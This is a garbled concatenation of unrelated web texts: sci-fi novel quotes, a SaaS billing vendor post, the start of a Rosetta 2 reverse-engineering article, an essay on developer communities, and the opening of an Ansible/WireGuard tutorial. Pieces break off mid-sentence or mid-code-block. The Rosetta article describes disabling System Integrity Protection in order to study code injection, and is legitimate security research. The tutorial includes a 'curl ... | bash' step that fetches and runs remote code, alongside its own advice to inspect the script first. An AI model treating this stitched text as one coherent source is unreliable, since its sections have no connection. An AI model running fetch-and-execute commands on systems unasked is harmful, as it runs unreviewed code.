Instead, we’d burned our home.”</p><p>“…a true utopia would have a one hundred percent suicide rate, where everyone dies precisely when and how they wish.”</p><p>“Theoretically the only tool you really needed to survive was a gun; everything else could be taken from others who lacked one.”</p><p>“Tragically ironic, isn’t it? How nuclear weapons represent both our species’ mastery over the very foundations of nature, as well as our utter inability to master our most primitive instincts.”</p><p>“Would intelligent life evolve again on this planet, and if so would it have the means — like opposable thumbs or a way to store knowledge outside of brains — to build technology? Dolphins could have lived for eternity and never developed the capability to annihilate their species or the world, much less colonize another.”</p><p>“We stood on the shoulders of giants, but we fell off.”</p><p>“There were many slippery slopes to nihilism in this new world, and the higher up you were the easier it was to fall down one of them.”</p><p><strong>(Dark) Humor</strong></p><p>“So, this is how the world ends, eh? Not with a bang, not with a whimper, but with a disgusting gurgling sound, he thought.”</p><p>“Chad was a twenty-six-year-old former developer of software used to develop more advanced software. He was now unemployed.”</p><p>“The story of Noah’s Ark, if you’re familiar, left out the part where the animal kingdom is repopulated entirely through rampant incest.”</p><p>“A fate worse than death, in that it also included death at the end.”</p><p>“Like no small number of wealthy people he’d taken up an antiquated form of transportation as a hobby.”</p><p>“The lights went down in the city, an artificial sun shining on the bay.”</p><p><strong>About Life</strong></p><p>“He’d been younger then, when sex meant both nothing and everything.”</p><p>“I used to wish I’d have nightmares — what a pleasure it would have been to wake up. If all your dreams are terrifying, reality actually becomes something to look forward to.”</p><p>“…life is a war we all lose in the end, but every day is a battle, and you can sure as hell win some of those.”</p><p>“But the surest way to live a worthwhile, meaningful life was to have already done so, those moments etched forever into the fabric of spacetime.”</p><p>“A not-so-subtle reminder that anyone can lose everything at any time, though few think it will happen to them and none get the chance to realize it did when it does.”</p><p>“How spectacularly things shine when viewed from the darkness…”</p><p><strong>About the Mind</strong></p><p>“…how can someone who may be losing his mind accurately assess his own sanity?”</p><p>“There’s nothing quite so terrifying as being unsure of your own sanity. All other concerns are downstream.”</p><p>“Once upon a time the only thing that couldn’t be taken from someone under any circumstances was their own attitude and thoughts. A sufficiently trained and powerful mind could always take refuge in itself. But Keli knew all too well this was no longer the case; when you strip away the layers of abstraction we’re merely chemical reactions and electric pulses, both of which can be manipulated.”</p><p>“But at this point I know I’m only remembering the last time I remembered, an increasingly distorted recursion reaching back in time.”</p><p><strong>About the Universe</strong></p><p>“With a fixed amount of matter and energy in the universe, everything is a zero-sum game on some level.”</p><p>“The electrified gas creating these vibrant displays was a distinct and oft-forgotten fourth phase of matter — plasma — that comprised more of the universe than all but matter’s fifth phase: dark.”</p><p>“There’s a brute fact at the end of every chain of causality. Some are just harder to accept than others. If you keep asking ‘why’ in any domain you eventually arrive at something that just seems to be true about reality, at least insofar as we understand it.”</p><p><em>If you like these quotes and are interested in a full book about these themes, my debut sci-fi novel </em>Mind Painter <em>is available on </em><a href="https://www.amazon.com/Mind-Painter-Tom-B-Night/dp/B08NDVJ3C8/" target="_blank"><em>Amazon</em></a><em>.</em></p></div></div></div></div></div></div></div>]]>

            <section>
                <div>
                    <p>It starts with a simple use case. You want to charge customers every month for getting access to your SaaS. Customers must be able to pick a plan, upgrade, update their card info, download invoices, and cancel the subscription. For a team with technical resources and no prior experience with billing and payments, this use case may seem like a fun project to build internally. For veteran founders and product leads, it is the tip of a giant iceberg of SaaS billing.</p><p>In this guide, we'll discuss the unforeseen risks of building an in-house SaaS billing integration.</p><h2 id="build-vs-buy-debatable-components">Build vs. buy debatable components</h2><p>SaaS billing is a complex, multi-layered beast. To better understand the debate on building versus buying a billing solution, it's best to look at each SaaS billing component.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Build-Vs.-Buy--1-.png" alt=""><figcaption>SaaS billing build vs. buy decision point</figcaption></figure><p>The core layers, including payments, subscription billing, and analytics, have evolved solutions that make the buy argument an easy win. Product teams don't reinvent tools like <a href="http://stripe.com/payments?ref=billflow">Stripe Payments</a> and <a href="https://stripe.com/billing?ref=billflow">Stripe Billing</a> for handling the logistics of payments and subscriptions. Analytical tools such as <a href="https://chartmogul.com/?ref=billflow">ChartMogul</a>, <a href="https://baremetrics.com/?ref=billflow">Baremetrics</a>, and <a href="http://profitwell.com/?ref=billflow">ProfitWell</a> make it very easy to plug and play with data.</p><p>The component that is usually up for debate by the product teams is the SaaS billing user interface and experience (UI/UX). Billing UI/UX consists of all the customer-facing billing logic the end-user interacts with inside your app. Think of it as the front-end of your billing. Unlike the rest, the billing UI component has fewer solutions, developers are less solution-aware, and it looks deceivingly simpler to build at first glance.</p><p>When SaaS companies are deciding on building vs. buying the billing UI, they focus most of their energy on finding the risks rather than the values they get from buying. <a href="https://twitter.com/Lethain">Will Larson</a>, CTO of <a href="https://www.calm.com/?ref=billflow">Calm</a>, explains this well in his <a href="https://lethain.com/build-vs-buy/?ref=billflow">Build versus buy masterpiece</a>:</p><!--kg-card-begin: markdown--><blockquote>
<p>"In the build versus buy decision, most companies put the majority of their energy into identifying risk, which has its place, but often culminates in a robust <a href="https://en.wikipedia.org/wiki/Not_invented_here">not invented here</a> culture that robs the core business of attention. To avoid that fate, it's important to spend at least as much time on the value that comes from buy decisions."</p>
</blockquote>
<!--kg-card-end: markdown--><h2 id="risks-values">Risks &amp; values</h2><p>The billing user interface is a very integral part of your billing flow. It is the bridge between billing and the customer acquisition strategy. In a survey of 136 SMB SaaS companies by <a href="https://www.billflow.io/">Billflow</a>, the top three factors companies looked for in a new billing UI solution were ease of set up, customizability, and reliability.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Screen-Shot-2021-03-02-at-12.39.09-PM.png" alt=""><figcaption>Survey of 136 SaaS businesses by Billflow</figcaption></figure><p>Rightfully so, development teams seek customizability, compatibility, and control over any internal or external tool they integrate with. Suppose there is a well-known solution that checks these boxes. In that case, the decision becomes simple, but when the status quo is building an in-house solution, it is the product leader's job to seek options to save time and resources. In the end, there should be a very compelling reason to build versus buying. <a href="https://www.cfodive.com/news/saas-billing-system-development/582545?ref=billflow">CFOdive</a> sums it well:</p><!--kg-card-begin: markdown--><blockquote>
<p>"A system that grows as your services and pricing become more complex will be far costlier and take longer than you expect."</p>
</blockquote>
<!--kg-card-end: markdown--><p>Luckily, we've done our research. Here are the value comparisons of buying a SaaS billing UI versus building one in-house.</p><h3 id="initial-implementation-time">Initial implementation time</h3><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/---1-.png" alt=""><figcaption>SaaS billing in-house integration cost vs. buying Billflow</figcaption></figure><p>Building an in-house billing integration requires a learning curve for the development team. We've spoken to over 500 SMB SaaS startups. The time it takes to implement billing into an app varies primarily based on the pricing model and the user acquisition strategy (freemium, free trial, etc.). Businesses in this segment spend an average of eight weeks to architect, implement, and test their initial SaaS billing integration. Calculating the in-house resource consumption, SaaS startups spend an average of $25,000 on building their initial version of SaaS billing. Buying an out-of-the-box solution can reduce the timeline to less than a week with a fraction of the cost!</p><h3 id="on-going-maintenance-support">On-going maintenance &amp; support</h3><p>Maintaining an in-house billing integration is time-consuming. There are unaccounted factors that will require development work as you scale your business and pricing model. Here are some common ones:</p><ul><li>You may need to update your billing flow. For example, moving from flat subscriptions to the usage-based model, introducing add-ons to upsell features, adding churn surveys to increase retention, or moving from free trials to freemium.</li><li>Features such as language support, currency localization, taxes &amp; VATs, and payment method support will inevitably come up as you scale.</li><li>You may want to update pricing or run promotional experiments.</li><li>You may need to change billing-related marketing copy to improve conversion.</li><li>Global policies could change. For example, EU requiring SCA.</li></ul><p>Buying a solution will give your developers instant access to billing features, updates, and, most importantly, billing experts who can save your development team a ton of time. Tools like <a href="https://www.billflow.io/">Billflow</a> work on top of <a href="https://stripe.com/billing">Stripe Billing</a> with Stripe's best practices for SaaS integration.</p><h3 id="product-focus">Product focus</h3><p>Time is precious, and focus is nontrivial. Focusing on the core product and not being distracted by building and maintaining internal tools is essential. Billing spans to more than just the development team. Finance and marketing teams often ask for aesthetic or pricing changes that will require billing changes. With an in-house integration, a simple verbiage change will require developers' time. Reducing the building and maintenance of non-product-related code will significantly impact the hours your development team spends on the product itself.</p><p>SaaS companies don't build an internal video conferencing tool, email, docs system, or messaging tool. As long as the tool is not part of the core product and vision, it is much more cost-effective to pay for it rather than building your own. The same goes for billing. Don't let the recurring cost and developer's love for building internal tools hold you back from focusing on your vision. If the price is higher than your budget, communicate transparently with the vendors, new markets are more forgiving with cost as they need adaption and feedback in the early days.</p><p>Nowadays, there is a range of low-code and no-code tools available to reduce the friction of building a scalable SaaS product. They maintain the code, so your developers don't have to. A great example of a no-code/low-code billing solution is <a href="https://stripe.com/billing?ref=billflow">Stripe Billing</a> and <a href="https://www.billflow.io/">Billflow</a> no-code billing toolkit.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Stack.png" alt=""><figcaption>Stripe Billing + Billflow</figcaption></figure><p>If you are looking for a Stripe Billing expert advice on your billing architecture, you can <a href="https://calendly.com/darafsheh/consultation">schedule a 30-minute call with me here</a>.</p>

<p>author: Koh M. Nakagawa</p>
<h2 id="introduction">Introduction</h2>
<p>Apple announced that it would be moving from Intel processors to Arm-based Apple Silicon CPUs for Macs at WWDC 2020.
The Apple Silicon-based Mac Book Air and Pro were released in October 2020 with great fanfare.</p>
<p>One of the issues that arise with the CPU transition is application compatibility.
Since Apple Silicon is an Arm-based processor, applications built for Intel-based Macs will no longer work.
To solve this problem, Apple offers the following two technologies:</p>
<ul>
<li>Universal Binary 2</li>
<li>Rosetta 2</li>
</ul>
<p>Universal Binary 2 is a mechanism to encapsulate binaries built for multiple architectures into a single binary, which is also called Fat Binary.
Apple has been using this technology for a long time to maintain backward compatibility.
A Mach-O loader selects the binary with the best architecture for the machine it is running on, then loads only that binary into memory to run the program.
Most macOS Big Sur system binaries are currently Fat Binaries, containing binaries built for both Arm and Intel architectures.</p>
<p>Rosetta 2 is a technology that translates Intel-based binaries or JIT-generated code into Arm-based binaries or code.
It is the successor to Rosetta, which was also used in the past processor transition.
There is not much information officially released by Apple.
Of course, there is no source code available, unlike the XNU kernel.
Also, at the time of writing this article, there seems to be no article that examines it in detail.</p>
<p>In this article, I introduce some reverse engineering results of Rosetta 2.</p>
<p>Why I take a closer look at Rosetta 2?</p>
<p>The reason is that I'm interested in translated binaries in Rosetta 2 and examining the possibility of exploiting them.
I presented <a href="https://www.blackhat.com/eu-20/briefings/schedule/index.html#jack-in-the-cache-a-new-code-injection-technique-through-modifying-x-to-arm-translation-cache-21324">a new code injection technique in Windows 10 on Arm at Black Hat EU</a> last December.
The code injection is achieved by modifying x86 to Arm (XTA) binary translation cache files.
This research encourages me to examine whether similar code injection techniques can be achieved with Rosetta 2.</p>
<p>In this part, I will cover the following points:</p>
<ul>
<li>The executables associated with Rosetta 2 and their roles</li>
<li>Analysis results of the translated binaries</li>
<li>JIT binary translation capabilities of Rosetta 2 (mainly focusing on x86_64 machine code decoding process)</li>
</ul>
<p>In the following, I will follow Apple's terminology when referring to architecture.</p>
<ul>
<li>arm64: The architecture specified when generating binaries to run on an Apple Silicon Mac</li>
<li>x86_64: The architecture specified when generating binaries to run on an Intel-based Mac</li>
</ul>
<h2 id="setting-up-the-analysis-environment">Setting up the analysis environment</h2>
<p>First, I show you how to set up the analysis environment.</p>
<p>Rosetta 2 is not installed by default on an Apple Silicon Mac.
So, you need to install it following the pop-up that appears when you run an x86_64 code for the first time.</p>
<figure>

    <figcaption>Figure 1 Rosetta 2 installation popup (https://support.apple.com/en-us/HT211861).</figcaption>
</figure>

<p>After the installation, a folder named <code>/Library/Apple/usr/libexec/oah/</code> (hereinafter referred to as the oah folder) is created, and you can see the following binaries installed.</p>
<figure>
    <img src="https://ffri.github.io/ProjectChampollion/assets/rosetta_binaries.png">
    <figcaption>Figure 2 Binaries installed after Rosetta 2 installation.</figcaption>
</figure>

<p>The role of each binary will be explained later.</p>
<p>The next step is to disable System Integrity Protection (SIP).
This is because the folder that contains the translated binaries is protected by SIP and cannot be accessed by default even with administrative privileges.</p>
<p>Please follow the steps below to disable SIP.</p>
<ul>
<li>Restart the OS</li>
<li>Press and hold Touch ID to boot in the recovery mode</li>
<li>Select Terminal from "Utilities" at the top of the screen</li>
<li>Type <code>csrutil disable</code> and execute</li>
<li>Restart the OS again</li>
</ul>
<p>In addition to this, please install Xcode and Command Line Tools for Xcode to use Clang and LLDB.</p>
<h2 id="roles-of-oahd-and-oahd-helper">Roles of <code>oahd</code> and <code>oahd-helper</code></h2>
<p>First, let's create a command line application built for x86_64 and monitor system events (e.g., process creation, file-system activities, and memory mapping) when the x86_64 application runs.</p>
<pre><code>$ cat hello.c
#include &lt;stdio.h&gt;
int main() {
    puts("Hello World");
    return 0;
}
$ clang -arch x86_64 hello.c -o hello.out # specify x86_64 as the target architecture
$ file hello.out
hello.out: Mach-O 64-bit executable x86_64
</code></pre>
<p>To obtain several system events, I used EventMonitor created using the <a href="https://developer.apple.com/documentation/endpointsecurity">Endpoint Security Framework</a>.
I will release EventMonitor as an OSS soon.</p>
<p>Start EventMonitor and run <code>hello.out</code>.
The following jsonl file contains logs obtained by EventMonitor. The only events related to Rosetta 2 are extracted.</p>
<p><a href="https://ffri.github.io/ProjectChampollion/assets/event.jsonl">event.jsonl</a></p>
<p>When you look at the first line of the logs, you can see an event where <code>/bin/zsh</code> executes <code>hello.out</code>.</p>
<pre><code>{"event":{"log":{"args":[".\/hello.out"],"cwd":{"path":"\/Users\/konakagawa.ffri","path_truncated":false},"last_fd":4,"target":{"executable_path":"\/Users\/konakagawa.ffri\/hello.out","group_id":54132,"pid":54132,"ppid":48492,"session_id":48491}},"type":"exec"},"target_process":{"executable_path":"\/bin\/zsh","group_id":54132,"pid":54132,"ppid":48492,"session_id":48491}}
</code></pre>
<p>After the exec system call, <code>oahd</code> daemon checks for the file <code>/var/db/oah/16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00/065b3f057e68a5474d378306e41d8b1e3e8e612b9cf9010b76449e02b607d7f0/hello.out.aot</code>.</p>
<pre><code>... (the oahd checks for the AOT file)
{"event":{"log":{"relative_target":"var\/db\/oah\/16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00\/065b3f057e68a5474d378306e41d8b1e3e8e612b9cf9010b76449e02b607d7f0\/hello.out.aot","source_dir":{"path":"\/","path_truncated":false}},"type":"lookup"},"target_process":{"executable_path":"\/Library\/Apple\/usr\/libexec\/oah\/oahd","group_id":426,"pid":426,"ppid":1,"session_id":426}}
</code></pre>
<p>The file with the extension <code>.aot</code> contains the result of the translation from x86_64 to arm64.
We refer to this file as the AOT file.
The name <code>.aot</code> comes from Ahead-Of-Time, which means that the translation is performed before a thread actually starts.
The <code>oahd</code> is the management daemon for the AOT files.</p>
<p>Since this is the first time we run <code>hello.out</code>, the <code>oahd</code> cannot find the corresponding AOT file. So, it creates a new AOT file.
If the same binary in the same path has already been executed and the AOT file has been created, the <code>oahd</code> uses it.</p>
<p>You can see the folder named <code>/var/db/oah</code> in the above logs.
This folder has a <code>Oah.version</code> file at the top, which is supposed to contain the version information for Rosetta 2.
Also, this folder has <code>16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00</code> folder.
We can see that multiple folders are containing AOT files in it.
The names of these folders are SHA-256 hash values that are calculated from both the contents of the file in x86_64 code and the path where it was executed.</p>
<pre><code># /var/db/oah contains the Oah.version file and 16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00 folder

<p>Note that the folders and files under <code>/var/db/oah</code> are protected by SIP, so we cannot access even with admin privileges.

<p>There's a big shift going on in how developer tools companies approach their userbase. In the past week alone, I've had 3 chats with startups that all concluded with some version of:</p>
<blockquote>
  <p>"By the way, we're really looking to ramp up our community effort right now. If you can think of anyone who can help us build a developer community, can you send them my way?"</p>
</blockquote>
<p>One week, three pings. If this isn't a big trend already, it's at least worth writing about (per <a href="https://www.swyx.io/three-strikes/">my Three Strikes rule</a>). <strong>Who builds developer communities, why are companies investing in them, and <em>why now</em>?</strong></p>
<p>

</p>
<section>
  <h2 id="whos-job-is-it-anyway"><a href="#whos-job-is-it-anyway">Who's Job Is It Anyway?</a></h2>
  <p>Developers have had a long history of spontaneous community formation dating back to the IRC and BBSes of yore. (<em>Misery loves company?</em>) There is still a strong ethos of self organized community in modern dev culture, but the vast majority of this lies on the shoulders of a small group of under-funded volunteers.</p>
  <p>But in the last couple decades, company-centric communities, where <strong>the community is almost the entire competitive moat</strong> of the company, have become a central part of developer life:</p>
  <ul>
    <li><strong>StackOverflow</strong> serves <a href="https://stackexchange.com/sites?view=list#traffic">11m visits a day</a> with community contributed Q&amp;A's and sells ads and knowledge base software on the side.</li>
    <li><strong>GitHub</strong> builds developer collaboration software, but at its core is a <a href="https://octoverse.github.com/">56m-developer</a> social network atop Git.</li>
    <li><strong>Hacker News</strong> (serving at least <a href="https://news.ycombinator.com/item?id=16076041">4m a day</a>) is a big part of Y Combinator's unfair advantage in getting both founder mindshare and hiring talent.</li>
  </ul>
  <p>You would expect that this realization would spawn a dedicated discipline to prioritize it, in the same way that <a href="http://www.paulgraham.com/growth.html">Startups = Growth</a> justifies the need for a <a href="https://andrewchen.co/how-to-be-a-growth-hacker-an-airbnbcraigslist-case-study/">Growth Hacker</a> at every company serious about growth.</p>
  <p>But as far as I can tell, it hasn't happened.</p>
  <p>Sure, companies do hire community managers to groom their forums and post inoffensive memes (<em>j/k of course, good community managers do much more than this</em>). Some developer advocates may focus on community, but most developer evangelists create content and do outreach to other communities, to "meet developers where they are". Marketing folks might run the company mailing list, host webinars, or organize conferences, all mini-communities in their own right. Everyone intuitively gets the importance of community, and does their best within given boundaries.</p>
  <p>But who's job is it to define the overall community strategy, and has the resources to develop it as aggressively as engineering? If this describes someone in your management team, great. But often the community builders are at the bottom of the totem pole.</p>
  <p>The Venn diagram of people who can scale code and people who can scale community is going to be <a href="https://www.heavybit.com/library/podcasts/jamstack-radio/ep-51-community-over-code-with-shawn-wang-of-netlify/">exceedingly valuable</a>. You don't strictly <strong>need</strong> to be technical to run community — Ben Popper, StackOverflow's Director of Content, is <a href="https://stackoverflow.blog/2019/10/22/ben-popper-is-the-worst-coder-in-the-world/">still new to code</a> — but developers can tell when they aren't talking to a technical person and that limits the depth of conversation. A technical community builder will have instincts informed by direct personal experience, and be able to empathize with member needs and make targeted recommendations.</p>
  <p>The job title probably won't stay "community builder", by the way. <a href="https://twitter.com/patio11/status/1299217439671025665?s=20">Patrick McKenzie once observed</a> that the DevOps movement led to "a once-in-a-lifetime upgrade in status, impact, authority, and career prospect" for sysadmins. I think a similar rebrand is due. As community goes from a side activity to a core driver of product, support, and marketing (<a href="https://blog.usejournal.com/the-rise-of-the-community-department-232d427de65f">great thoughts from Lisa Xu on this</a>), the status and pay change will need a new name for people to rally behind.</p>
  <p>What shall we call it? "Community <a href="https://dangerouslyawesome.com/2014/04/community-management-tummling-a-tale-of-two-mindsets/">Tummler</a>"? "Community Developer"? Let me know if you have a better name. I've settled on "Technical Community Builder" for now, in the same way that Microsoft and Amazon have Technical Product Managers.</p>
</section>
<section>
  
  <p>TL;DR: <strong>Traditional marketing and support isn't cutting it</strong>.</p>
  <p>Devtools companies get that "build it and they will come" usually doesn't work. The sub-industries of technical marketing and developer relations are well developed enough now that there are <a href="https://learn.samjulien.com/getting-started-in-developer-relations">books</a> and <a href="https://www.devrelcon.net/">conferences</a> about it. We get that marketing can be just as important as product. (<em>Let's leave the topic of "how much devrel and marketing overlap" for a future post...</em>)</p>
  <p>But a buyer's journey can start long before — and continue long after — their first contact and passage through the marketing funnel:</p>
  <ul>
    <li>Marketing attribution in developer tools is kayfabe — we play at tracking Twitter clickthroughs and podcast direct response, but everyone in marketing knows you need at least <a href="https://www.socialmediatoday.com/content/seven-touches-basic-marketing-principle-action">7-13 touches</a> before someone really considers you. As a developer I often wait out <em>an entire year</em> after hearing about something before even trying it out, just to see if it has staying power.</li>
    <li>After buying into a solution, I still need help to be successful with the tool. Developer tools are ultimately creative tools, and sometimes the imagination needs a little inspiration. Setup hurdles need to be overcome. If I buy something and end up not using it, it's going into the do-not-use pile for a very, very long time before I ever give it another shot.</li>
  </ul>
  <p>This adoption process needs to turn from a mostly-transactional, finite game, to a relationship-based infinite game. You might envision Community as carefully designing the broader environment around the traditional sales and marketing funnel:</p>
  <p>
    <img src="https://user-images.githubusercontent.com/6764957/109989150-31fee000-7d43-11eb-9818-59daf4797147.png" alt="Developer Journey">
  </p>
  <p>Or you could <strong>reject the funnel</strong> altogether. To quote <a href="https://twitter.com/patrickjwoods/">Patrick Woods</a>:</p>
  <blockquote>
    <p>"Characterizing the developer journey as a linear funnel doesn’t really tell the whole story, as it’s essentially scoped to awareness and conversation — the journey is much more complex. I think onboarding to the community itself, retaining over time, and advocating for others to join, is a huge part of the journey... In this world, you want to understand how folks are engaging with the community <em>as well as</em> with the company/product, with product metrics (activation, adoption, etc) existing as second-order effects of the community. <a href="https://github.com/orbit-love/orbit-model">The Orbit Model</a>, versus the funnel, tries to tell this nonlinear and comprehensive story."</p>
  </blockquote>
  <p>When most developers make technical choices, you are just as likely to hear them praise the strength of the "ecosystem" (aka a community, with thriving third parties) as they do the core technical merits. In terms of <a href="https://twitter.com/swyx/status/1360882870638665731">the Rogers curve</a>, this is the kind of argument made by "mainstream" developers:</p>
  <p>
    <img src="https://user-images.githubusercontent.com/6764957/109990452-5e672c00-7d44-11eb-8a0b-159491db2d6b.png" alt="Community crossing the chasm">
  </p>
  <p><strong>Community is how developer tools cross the chasm</strong> from early adopters to the majority. Every devtools company looking to scale eventually has to figure this out, whether consciously or otherwise.</p>
  <p>Other arguments in bullet point form, but feel free to request elaborations:</p>
  <ul>
    <li>
      <p><strong>Retention</strong>: Build product and they may not come, but <strong>build community and they will stay.</strong></p>
    </li>
    <li>
      <p><strong>Hiring</strong>: Community can just as easily net you employees as it does users and customers.</p>
    </li>
    <li>
      <p><strong>Marketing</strong>: Community is highest-signal social proof/word of mouth you <strong>cannot</strong> buy.</p>
    </li>
    <li>
      <p><strong>Moat</strong>: Community is a "feature" that cannot be copied. By Hamilton Helmer's 7 Powers Framework (<em><a href="https://www.sachinrekhi.com/7-powers-hamilton-helmer">the strategy framework du jour</a></em>), Community helps you gain Network Economies, increase Switching Costs and Corner one of the most precious resources on Earth: Developers!.</p>
    </li>
    <li>
      <p><strong>Scaling</strong>: Community is many-to-many, where Marketing/Devrel is one-to-many. The value of a community-focused user base scales by Metcalfe's law instead of Sarnoff's law. A thriving third-party <em>ecosystem</em> scales by Reed's law — even better!</p>
      <p>
        <img src="https://user-images.githubusercontent.com/6764957/109877251-bd2d9680-7cad-11eb-8a18-4b4330745d6c.png" alt="Reed's law">
      </p>
    </li>
    <li>
      <p><strong>Risks</strong>: But you also do not "own" your community - the best you can do is lead by example, encourage helpful behavior, and enforce clear codes of conduct. Community is "user-generated content", and that bears with it great responsibility. Poor handling can <a href="https://www.fastcompany.com/90401254/ea-gets-a-guinness-world-record-for-the-most-downvoted-comment-in-reddit-history">backfire horrifically</a>.</p>
    </li>
    <li>
      <p><strong>Free Work?</strong> Community members can answer questions to each other and develop integrations to help you grow beyond your limited resources. To avoid expecting members to "do free work", this effort must be reciprocated by careful stewardship.</p>
    </li>
    <li>
      <p><strong>Lifespan</strong>: One of the best measures of community success is when your users' relationship with you outlasts their current employment. <strong><a href="https://hunterwalk.medium.com/coming-for-the-content-staying-for-the-community-started-with-video-games-or-maybe-religion-5083f3773a2">Come for the software, stay for the community</a></strong>. Help your users get jobs, help your customers hire your users, and you will have fans for life.</p>
    </li>
    <li>
      <p><strong>Open Source</strong>: Commercial Open Source companies must foster a viable community to be successful open source, rather than being de-facto "source available". In <a href="https://www.thepullrequest.com/p/nadia-eghbal">Nadia Eghbal's terms</a>, more Federations than Stadiums, but both are definitely preferable over Clubs and Toys.</p>
    </li>
    <li>
      <p><strong>Product Insights</strong>: Speaking to users helps you build things people want, but often these conversations are done by outreach (user survey or feedback session) rather than observation (<em>in situ,</em> natural environment). Community is where your deepest and most authentic user insights will originate.</p>
    </li>
  </ul>
  <p>All in all — <strong>a devtools company that prioritizes an engaged and inclusive developer community will run circles around one that doesn't.</strong></p>
  <p>There are multiple ways to do this well, but I am particularly fond of community that "serves a bigger purpose". A community that is strictly centered around a company (eg Dreamforce → Salesforce) is less appealing than one with room for multiple players (eg No Code → Webflow, Jamstack → Netlify), at least while you aren't yet a decacorn. Every great community is a great marketplace (<em>tbc in a future post...</em>), and every marketplace is a kind of platform, and every platform must respect <a href="https://twitter.com/swyx/status/1360729115372920832">the Bill Gates Line</a> with its participants.</p>

March 4, 2021 | https://www.tangramvision.com/blog/exploring-ansible-via-setting-up-a-wireguard-vpn | <a href="https://web.archive.org/web/*/https://www.tangramvision.com/blog/exploring-ansible-via-setting-up-a-wireguard-vpn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In my [previous blogpost](https://www.tangramvision.com/blog/what-they-dont-tell-you-about-setting-up-a-wireguard-vpn), we set up a WireGuard VPN server and client and learned about various configuration options for WireGuard, how to improve VPN server uptime, how to relay traffic, and more. Setting up a server and client like that is a lot of work! If the server dies or you want to set up a new server (maybe for a friend or family member this time), you have to go back to the walk-through and follow all the steps, remembering if you deviated from those instructions at any point.</p><p>There's a better way — automation! If you're only going to do a thing once (e.g. set up a VPN), investing in automation probably doesn't make sense. But if you anticipate doing a thing repeatedly, automating it frees up your time to learn and accomplish more in the future. You can also share your automation, empowering others to build and achieve more, faster.</p><p>Automation is the heart of computing, and many different automation tools and approaches have sprung up over time. For our project of automating VPN server setup, we can consider a variety of tools:</p><p>- Shell scripts<br> &nbsp; &nbsp;- The simplest approach from a tooling perspective, writing shell scripts would involve running the commands from the [previous WireGuard tutorial blogpost](https://www.tangramvision.com/blog/what-they-dont-tell-you-about-setting-up-a-wireguard-vpn), using `ssh` for the commands that run on the server and `rsync` to copy configurations files to the server.<br>- SSH scripting libraries like [Capistrano](https://capistranorb.com/documentation/overview/what-is-capistrano/) or [Fabric](http://www.fabfile.org/)<br> &nbsp; &nbsp;- If shell scripting isn't ideal, there are libraries that expose similar scripting functionality in a more ergonomic interface for developers familiar with higher-level languages like Ruby and Python.<br>- Infrastructure/configuration automation tools like [Puppet](https://puppet.com/), [Chef](https://www.chef.io/), or [Ansible](https://www.ansible.com/)<br> &nbsp; &nbsp;- Tools in this category are even more specialized for automating server infrastructure and configuration, often including an ecosystem of packages and plugins to automatically set up or configure nearly anything you can think of.<br>- Infrastructure-as-code tools like [Terraform](https://www.terraform.io/)<br> &nbsp; &nbsp;- Infrastructure-as-code (IaC) tools have a lot of overlap with the above category, but support provisioning cloud resources in a more first-class/native way.<br>- Containers like [Docker](https://www.docker.com/)<br> &nbsp; &nbsp;- You could also run WireGuard in containers, deploying a server-configured container image to a cloud provider and running a client-configured container image locally to connect to the server. There are [a few](https://medium.com/@firizki/running-wireguard-on-docker-container-76355c43787c) [existing](https://hub.docker.com/r/linuxserver/wireguard) [examples](https://blog.jessfraz.com/post/installing-and-using-wireguard/) of this approach.</p><p>For this tutorial, I'm going to focus on the middle category above — infrastructure/configuration automation tools — and specifically, I'll focus on Ansible. There is a [great comparison of different tools in this area](https://blog.gruntwork.io/why-we-use-terraform-and-not-chef-puppet-ansible-saltstack-or-cloudformation-7989dad2865c) by Gruntwork and, even though that article favors Terraform, Ansible is still a useful general-purpose tool, especially if you're working with servers that aren't "in the cloud", such as a Raspberry Pi at home.</p><p>Let's get started with automating VPN setup with Ansible! By the end of this article, we'll be able to set up a VPN server and client with a single command. Similar to the previous blogpost, I'll use Ubuntu 20.04 and DigitalOcean droplets.</p><p># Setting up Ansible</p><p>Ansible can be [installed via an OS package manager](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) like `apt`, but I prefer to use `pip` so I can get the latest updates and avoid cluttering system package management with third-party PPAs (Personal Package Archives). We'll also use `pyenv` (as suggested by [Hypermodern Python](https://medium.com/@cjolowicz/hypermodern-python-d44485d9d769#6e8a)) to make sure we're not breaking or cluttering the system Python installation. Install `pyenv` with the following:</p><p>```bash<br># From https://github.com/pyenv/pyenv/wiki#suggested-build-environment<br>sudo apt-get update</p><p>sudo apt-get install --no-install-recommends make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev</p><p>curl https://pyenv.run | bash<br>```</p><p>It's a good habit when a tutorial gives you `curl &lt;url&gt; | bash` to open up that URL and see what it's going to do. In this case, you'll see that it'll download and execute a shell script on GitHub that will clone 6 repos from GitHub to your `~/.pyenv` folder and prompt you to add a few lines to your shell's initialization script.</p><p>Follow the output prompt from above, which asks you to put lines like the below in your shell initialization script (e.g. `~/.bashrc` if you use the bash shell). Make sure to fill in your own username!</p><p>```bash<br>export PATH="/home/YOUR_USERNAME/.pyenv/bin:$PATH"<br>eval "$(pyenv init -)"<br>eval "$(pyenv virtualenv-init -)"<br>```</p><p>Install a recent python version:</p><p>```bash<br># List available python versions<br>pyenv install --list</p><p># Install a specific version<br>pyenv install 3.9.2</p><p># (Suggested) If you want to always use that version when running `python`<br># in your terminal<br>pyenv global 3.9.2<br>```</p><p>If you want, you can also create a [virtualenv](https://virtualenv.pypa.io/en/latest/) to further isolate the Ansible installation, and make that virtualenv automatically activate when you're in a particular folder/repo. That would look like:</p><p>```bash<br># (Optional)</p><p># Feel free to pick a different virtualenv name than "ansible-tutorial"<br>pyenv virtualenv 3.9.2 ansible-tutorial</p><p># Create a .python-version file that pyenv will find when your shell is in the <br># same directory (or 